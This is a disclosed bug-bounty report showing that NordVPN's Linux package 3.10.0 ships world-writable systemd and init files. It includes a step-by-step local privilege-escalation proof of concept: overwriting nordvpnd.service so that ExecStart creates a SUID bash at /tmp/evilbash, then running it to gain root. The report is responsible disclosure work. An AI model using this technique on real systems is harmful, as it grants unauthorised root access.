# NordVPN Linux Client - Unsafe service file permissions leads to Local Privilege Escalation

## Report Details
- **Report ID**: 1218523
- **URL**: https://hackerone.com/reports/1218523
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-06-06T12:21:46.151Z
- **Disclosed**: 2022-08-24T18:48:18.091Z

## Reporter
- **Username**: bashketchum
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nordsecurity

## Vulnerability Information
The Linux package available in NordVPN's repository is affected by a permission issue in init script and systemd unit files that allows any user on the system to execute arbitrary command as root.

## Tested Version

Tested version is the latest available on the repository, which is `3.10.0` and is available at:

https://repo.nordvpn.com/deb/nordvpn/debian/pool/main/nordvpn_3.10.0-1_amd64.deb

```
root@debian:/var/cache/apt/archives# sha256sum nordvpn_3.10.0-1_amd64.deb 
04d0089e326542c629c5f50a235de82bf3fa9fa829065be0490a0902e6770b63  nordvpn_3.10.0-1_amd64.deb
```

Test system is debian 10.

Previous versions are also affected.

## Technical Details

The Linux package in the official NordVPN repository ships with the following files:

```
root@debian:~# dpkg -c /var/cache/apt/archives/nordvpn_3.10.0-1_amd64.deb 
drwxr-xr-x 0/0               0 2021-05-31 11:45 ./var/
drwxr-xr-x 0/0               0 2021-05-31 11:45 ./var/lib/
drwxr-xr-x 0/0               0 2021-05-31 11:45 ./var/lib/nordvpn/
-rw-rw-rw- 0/0            4973 2021-04-07 10:15 ./var/lib/nordvpn/icon.svg
drwxr-xr-x 0/0               0 2021-05-31 11:45 ./etc/
drwxr-xr-x 0/0               0 2021-05-31 11:45 ./etc/init.d/
-rwxrwxrwx 0/0            2442 2021-04-07 10:15 ./etc/init.d/nordvpn
-rwxr-xr-x 0/0         3135944 2021-05-31 11:44 ./var/lib/nordvpn/openvpn
drwxr-xr-x 0/0               0 2021-05-31 11:45 ./usr/
drwxr-xr-x 0/0               0 2021-05-31 11:45 ./usr/lib/
drwxr-xr-x 0/0               0 2021-05-31 11:45 ./usr/lib/systemd/
drwxr-xr-x 0/0               0 2021-05-31 11:45 ./usr/lib/systemd/system/
-rw-rw-rw- 0/0             368 2021-04-07 10:15 ./usr/lib/systemd/system/nordvpnd.service
-rw-rw-rw- 0/0             229 2021-04-07 10:15 ./usr/lib/systemd/system/nordvpnd.socket
drwxr-xr-x 0/0               0 2021-05-31 11:45 ./usr/lib/tmpfiles.d/
-rw-rw-rw- 0/0              32 2021-04-07 10:15 ./usr/lib/tmpfiles.d/nordvpn.conf
drwxr-xr-x 0/0               0 2021-05-31 11:45 ./usr/bin/
-rwxr-xr-x 0/0        12274928 2021-05-31 11:45 ./usr/bin/nordvpn
drwxr-xr-x 0/0               0 2021-05-31 11:45 ./usr/sbin/
-rwxr-xr-x 0/0        25503576 2021-05-31 11:45 ./usr/sbin/nordvpnd
drwxr-xr-x 0/0               0 2021-05-31 11:45 ./var/lib/nordvpn/data/
-rw------- 0/0              67 2021-05-31 11:43 ./var/lib/nordvpn/data/cybersec.dat
-rw------- 0/0             137 2021-05-31 11:43 ./var/lib/nordvpn/data/insights.dat
-rw------- 0/0            3465 2021-05-31 11:43 ./var/lib/nordvpn/data/ovpn_template.xslt
-rw------- 0/0            4109 2021-05-31 11:43 ./var/lib/nordvpn/data/ovpn_xor_template.xslt
-rw------- 0/0             800 2021-05-31 11:43 ./var/lib/nordvpn/data/rsa-key-1.pub
-rw------- 0/0         2924507 2021-05-31 11:43 ./var/lib/nordvpn/data/servers.dat
drwxr-xr-x 0/0               0 2021-05-31 11:45 ./usr/share/
drwxr-xr-x 0/0               0 2021-05-31 11:45 ./usr/share/man/
drwxr-xr-x 0/0               0 2021-05-31 11:45 ./usr/share/man/man1/
-rw-r--r-- 0/0            1813 2021-05-31 11:43 ./usr/share/man/man1/nordvpn.1.gz
drwxr-xr-x 0/0               0 2021-05-31 11:45 ./usr/share/bash-completion/
drwxr-xr-x 0/0               0 2021-05-31 11:45 ./usr/share/bash-completion/completions/
-r--r--r-- 0/0             572 2021-05-31 11:44 ./usr/share/bash-completion/completions/nordvpn
drwxr-xr-x 0/0               0 2021-05-31 11:45 ./usr/share/zsh/
drwxr-xr-x 0/0               0 2021-05-31 11:45 ./usr/share/zsh/functions/
drwxr-xr-x 0/0               0 2021-05-31 11:45 ./usr/share/zsh/functions/Completion/
drwxr-xr-x 0/0               0 2021-05-31 11:45 ./usr/share/zsh/functions/Completion/Unix/
-r--r--r-- 0/0             488 2021-05-31 11:44 ./usr/share/zsh/functions/Completion/Unix/_nordvpn_auto_complete
drwxr-xr-x 0/0               0 2021-05-31 11:45 ./usr/share/doc/
drwxr-xr-x 0/0               0 2021-05-31 11:45 ./usr/share/doc/nordvpn/
-rw-r--r-- 0/0            5504 2021-05-31 11:45 ./usr/share/doc/nordvpn/changelog.gz
```

Some of these files are created with unsafe permissions, this allow any user on the system to overwrite them:

```
-rwxrwxrwx 0/0            2442 2021-04-07 10:15 ./etc/init.d/nordvpn
-rw-rw-rw- 0/0             368 2021-04-07 10:15 ./usr/lib/systemd/system/nordvpnd.service
-rw-rw-rw- 0/0             229 2021-04-07 10:15 ./usr/lib/systemd/system/nordvpnd.socket
```

By overwriting these files, an unprivileged user can trigger the init system to execute arbitrary code as UID 0.

## PoC

The original service unit shipped with the package is this:

```
[Unit]
Description=NordVPN Daemon
Requires=nordvpnd.socket
After=network-online.target
Wants=network-online.target

[Service]
ExecStart=/usr/sbin/nordvpnd
NonBlocking=true
KillMode=process
Restart=on-failure
RestartSec=5
# centos7 RuntimeDirectory ignored
RuntimeDirectory=nordvpn
RuntimeDirectoryMode=0770
# User=root
Group=nordvpn

[Install]
WantedBy=default.target
```

An attacker could override the `ExecStart` entry to execute arbitrary code. For example, this line creates a `SUID` bash binary in `/tmp`:

```
ExecStart=/usr/bin/bash -c "cp /usr/bin/bash /tmp/evilbash; chmod u+s /tmp/evilbash;"
```


### Step by step exploitation

Commands beginning with `#` need a privileged account, while commands beginning with `$` are executed in the context of the unprivileged attacker.

1. Add NordVPN repo as a privileged user

```
# wget https://repo.nordvpn.com/deb/nordvpn/debian/pool/main/nordvpn-release_1.0.0_all.deb
# dpkg -i nordvpn-release_1.0.0_all.deb
```

2. Install NordVPN client as a privileged user

```
# apt-get update
# apt-get install nordvpn
```

3. Proof there's no suid bash in /tmp

```
$ ls -la /tmp
```

4. Edit systemd service file as an unprivileged user

```
$ cat << EOF > /usr/lib/systemd/system/nordvpnd.service
[Unit]
Description=NordVPN Daemon
Requires=nordvpnd.socket
After=network-online.target
Wants=network-online.target

[Service]
ExecStart=/usr/bin/bash -c "cp /usr/bin/bash /tmp/evilbash; chmod u+s /tmp/evilbash;"
NonBlocking=true
KillMode=process
Restart=on-failure
RestartSec=5
# centos7 RuntimeDirectory ignored
RuntimeDirectory=nordvpn
RuntimeDirectoryMode=0770
# User=root
Group=nordvpn

[Install]
WantedBy=default.target
EOF
```

5. Reboot the system to reload and restart the new service (privileged user may not be required if the attacker has physical access to the system)
```
# reboot
```

6. Execute the SUID bash to get root

```
$ ls -l /tmp
$ /tmp/evilbash -p
evilbash-5.0# id
uid=1000(user) gid=1000(user) euid=0(root) groups=1000(user),998(nordvpn)
```

## Impact

The attacker can execute arbitrary command as the root user on the system.

## Attachments
- nordvpn-pe.ogv
